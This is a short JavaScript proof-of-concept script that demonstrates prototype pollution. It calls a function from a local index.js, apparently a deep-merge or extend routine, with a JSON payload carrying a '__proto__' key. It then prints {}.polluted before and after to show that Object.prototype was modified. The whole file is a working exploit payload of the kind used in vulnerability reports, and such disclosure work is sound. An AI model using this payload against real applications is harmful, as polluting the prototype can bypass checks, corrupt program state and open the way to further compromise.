const e = require("./index.js")
console.log("Before " + {}.polluted)
e(true, {}, JSON.parse('{"__proto__": {"polluted": "polluted"}}'))
console.log("After: " + {}.polluted)
